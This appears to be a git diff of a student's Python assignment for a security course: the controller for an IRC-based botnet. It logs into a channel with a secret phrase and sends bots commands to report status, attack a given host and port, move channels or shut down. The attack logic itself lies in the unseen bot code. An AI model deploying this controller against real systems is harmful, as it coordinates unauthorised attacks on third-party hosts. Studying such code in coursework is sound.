@@ -1,36 +1,35 @@
+"""
+CPSC 526 Assignment	#6
+Steven Leong 10129668 T01	
+Josh Quines	10138118 T03
+"""
+
 import time
 import socket 
 import sys 
-
-HOST = None
-PORT = None 
-CHANNEL = None 
-PHRASE = None
-IRCSOCKET = None 
-
-
+import threading
 
 class conBot:
-    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET
-
-    # CONTROLLER INFO
-    conNick = "SLAVE_DRIVER"
-    liveConnection = False # Flag to see if controller connection to IRC Server is active
-    command = None
-
-    # BOT INFO
-    botList = []
-    botsSuccessful = []
-    botsFailed = []
-    botsMoved = []
-    botsDisconnected = []
-
+    
     def setup(self, host, port, channel, phrase):
+        self.acceptedComs = ["status", "attack", "move", "quit", "shutdown"]
         self.HOST = host
-        self.PORT = port
+        self.PORT = int(port)
         self.CHANNEL = channel
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # CONTROLLER INFO
+        self.conNick = "SLAVE_DRIVER738"
+        self.liveConnection = False # Flag to see if controller connection to IRC Server is active
+        self.command = None
+
+        # BOT INFO
+        self.botList = []
+        self.botsSuccessful = []
+        self.botsFailed = {}
+        self.botsMoved = []
+        self.botsMoveFailed = []
+        self.botsDisconnected = []
 
         try:
             self.IRCSOCKET.connect((self.HOST, self.PORT))
@@ -38,155 +37,127 @@ class conBot:
             sys.stderr.write("Error: " + str(e))
             sys.exit(0)
 
-    def connect(self):
-        sock.send(bytes("USER "+ self.conNick +" "+ self.conNick +" "+ self.conNick + " " + self.conNick + "\n", "UTF-8"))
-        sock.send(bytes("NICK "+ self.conNick +"\n", "UTF-8"))
-        sock.send(bytes("JOIN "+ self.CHANNEL +"\n", "UTF-8"))
-        self.liveConnection = True
-        print("Controller is running. Connected with nick: " + self.conNick)
-        return
+        
 
-    # PingPong protocol
-    def pingPong(self):
-        pass 
+    def IRCconnect(self):
+        self.sendData("NICK {}\n" .format(self.conNick))
+        self.sendData("USER bot * * :{}\n" .format(self.conNick))
+        self.sendData("JOIN #{}\n" .format(self.CHANNEL))
+        resp = self.getData()
+        return "433" in resp
 
     # Get response from Bot 
-    def getResponse(self):
-        try:
-            # Get response from bot
-            msg = ircSocket.recv(1024).decode('utf-8')
-            return msg 
-        except:
-            return False
+    def getData(self):
+        return self.IRCSOCKET.recv(2048).decode().strip()
 
-    # COMMANDS
+    def sendData(self, msg):
+        self.IRCSOCKET.send(msg.encode())
 
-    # Get bot status
-    def botStatus(self):
-        # Get bot Nickname and how many there are
-        # Append these bots to a list
-        msg = self.getResponse()
-        if msg != False:
-            msg = msg.strip()
-            msgLines = msg.split("\n")
-            # Get bot names from split lines
-            for x in msgLines:
-                # See if there is a private message from Bot Slaves
-                if x.startswith(":SLAVE_PLEB"):
-                    botName = x[x.find(":", 1) + 1:].strip()
-                    botList.append(botName)
-            botNames = "\n".join(botList)
-            print("Num of bots: " + str(len(botList)) + "\nBot Names:\n" + botNames)
-            botList.clear()
+    def sendCommand(self, receiver, msg):
+        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
+    
 
-    # Tell bot to attack
-    def botAttack(self, host, port, channel):
-        self.sendCommand("attack")
-        # Get bot responses 
-        msg = self.getResponse()
-        if msg != False:
-            try:
-                msg = msg.strip()
-                msgLines = msg.split("\n")
-                for x in msgLines:
-                    # Get bot responses
-            except:
-                pass
-
-
-
-    # Tell bot to move channel
-    def botMove(self, host, port, channel):
-        pass 
-
-    # Tell bot to quit
-    def botQuit(self):
-        global IRCSOCKET
-        pass 
-
-    # Tell bot to shutdown
-    def botShutdown(self): 
-        pass
-
-    # SEND A PRIVATE MESSAGE/COMMAND TO BOTS
-    def sendCommand(self, msg):
-        toBot = "PRIVMSG " + CHANNEL + " :" + str(msg) + " " + PHRASE + "\n"
-        self.IRCSOCKET.send(toBot.encode())
-        return
-
-    def botHandler(self):
-        global liveConnection
-        while liveConnection:
-            # Gotta do the readable thing here
-            readable, writable, exceptable = select.select([IRCSOCKET, sys.stdin],[sys.stdout],[])
-            for x in readable:
-                # Start parsing data 
-
-                # If data starts with PONG, send PING 
-                self.pingPong() 
-
-                # elif data in command 
-                # status, attack, move, quit, shutdown 
-
-    """
-    # CONNECT TO IRC SERVER CHANNEL
-    # This next line goes to a function
-    # ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    def serverConnect(self, host, port):
-        global IRCSOCKET, liveConnection 
-        try:
-            IRCSOCKET = connect((host,port))
-            print("Connection successful")
-            liveConnection = True 
-            return True
-        except:
-            print("Connection failed")
-            return False 
-    """
-
-    def run(self):
-        while true:
+    def handleResponse(self, prefix, text):
+        if text.find("Correct pass") != -1:
+            self.botList.append(text.split("-")[1]) 
+        elif text.find("Attack successful") != -1:
+            self.botsSuccessful.append(text.split("-")[1])
+        elif text.find("Attack failed") != -1:
+            self.botsFailed[text.split(" - ")[1]] = [text.split(" - ")[2]]
+        elif text.find("Move successful") != -1:
+            self.botsMoved.append(text.split("-")[1])
+        elif text.find("Move failed") != -1:
+            self.botsMoveFailed.append(text.split("-")[1])
+        elif text.find("Shutdown successful") != -1:
+            self.botsDisconnected.append(text.split("-")[1])
             
-            if not self.liveConnection:
-                self.connect()
+
+    def reader(self):
+        try:
+            while True:
+                response = self.getData() 
+                if(response != ""):                                         
+                        if response.find("PRIVMSG") != -1:                           
+                            name = response.split('!',1)[0][1:]
+                            message = response.split('PRIVMSG',1)[1].split(':',1)[1]
+                            self.handleResponse(name, message)                              
+                        elif response.find("PING") != -1:
+                            self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                          
+     
+        except Exception as e:
+            time.sleep(5)
+            self.reader()
+
+
+    # takes command input from user and sends it to bots
+    def commandHandler(self):
+        while True:
 
             userCommand = input("command> ")
             self.command = userCommand.split()
-            # somewhere send phrase to bot
-            # check command
-            # send command to bots for them to do
+
+            if self.command[0] not in self.acceptedComs:
+                print("Incorrect Command Used")
+                print("Valid commands are: status, attack, move, quit, shutdown")
+                continue
+
+            self.sendCommand("#" + self.CHANNEL, self.PHRASE)
+
             if (self.command[0] == "status"):
-                sendCommand(command[0])
+                self.botList = []
+                self.sendCommand("#" + self.CHANNEL, self.command[0])
+                time.sleep(5)
+                self.botList.sort
+                if len(self.botList) == 0:
+                    print("Found 0 bots.")
+                elif len(self.botList) == 1:
+                    print("Found {} bot: {}".format(str(len(self.botList)),','.join(self.botList)))
+                else:
+                    print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))
+
             elif (self.command[0] == "attack"):
                 if (len(self.command) == 3):
                     self.botsSuccessful = []
-                    self.botsFailed = []
-                    self.sendCommand(userCommand)
+                    self.botsFailed = {}
+                    self.sendCommand("#" + self.CHANNEL, userCommand)
+                    time.sleep(5)
+                    for bot in self.botsSuccessful:
+                        print("{}: attack successful".format(bot))
+                    for bot in self.botsFailed:
+                        print("{}: attack failed, {}".format(bot, self.botsFailed[bot]))
                 else:
                     print("Incorrect usage of command: attack <host-name> <port>")
+
             elif (self.command[0] == "move"):
                 if(len(self.command) == 4):
                     self.botsMoved = []
-                    self.sendCommand(userCommand)
+                    self.botsMoveFailed = []
+                    self.sendCommand("#" + self.CHANNEL, userCommand)
+                    time.sleep(5)
+                    for bots in self.botsMoved:
+                        print("{}: move successful".format(bots))
+                    for bots in self.botsMoveFailed:
+                        print("{}: move failed".format(bots))
                 else:
                     print("Incorrect usage of command: move <host-name> <port> <channel>")
             elif (self.command[0] == "quit"):
+                self.IRCSOCKET.close()
                 sys.exit(0)
             elif (self.command[0] == "shutdown"):
                 self.botsDisconnected = []
-                self.sendCommand(self.command[0])
+                self.sendCommand("#" + self.CHANNEL, self.command[0])
+                time.sleep(5)
+                for bot in self.botsDisconnected:
+                    print("{}: shutting down".format(bot))
+                print("Total: {} bots shut down".format(len(self.botsDisconnected)))
             
-                
-                    
-
-
-
-if __name == "__main__":
-    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET
-
-    # Get sys.argv
+def main():
+    
+    invalidNick = True
+    noConnection = True
+        # Get sys.argv
     if len(sys.argv) != 5:
-        print("Wrong numnber of arguments")
+        print("Wrong number of arguments")
         sys.exit() 
     
     HOST = sys.argv[1]
@@ -194,24 +165,40 @@ if __name == "__main__":
     CHANNEL = sys.argv[3]
     PHRASE = sys.argv[4]
 
+    # Check if port is in valid range 
     if not PORT.isdigit():
         print("Invalid port.")
         sys.exit() 
     
-    # Check if port is in valid range 
-    
     cbot = conBot()
-    cbot.setup(HOST, PORT, CHANNEL, PHRASE)
 
     # Keep connection to IRC server 
     while True:
-        con.run()
-        """
-        connectStatus = serverConnect(HOST, PORT)
-        if connectStatus == True:
-            # Send initial PING? 
-            pingPong()
+        
+        # set up controller bot and try to connect to the IRC
+        try:
+            cbot.setup(HOST, PORT, CHANNEL, PHRASE)
+        except Exception as e:
+            print("{} Trying to reconnect..." .format(e))
+            continue
 
-            # Start giving commands to bot
-            botHandler()
-        """
+        while noConnection:
+            noConnection = cbot.IRCconnect()
+        
+        
+        print("Controller is running. Connected with nick: " + cbot.conNick)
+
+
+        # create a thread that will continuously read from the IRC
+        readThread = threading.Thread(target = cbot.reader)
+        readThread.daemon = True
+        readThread.start()
+        
+        cbot.commandHandler()
+
+
+
+if __name__ == "__main__":
+    main()
+
+
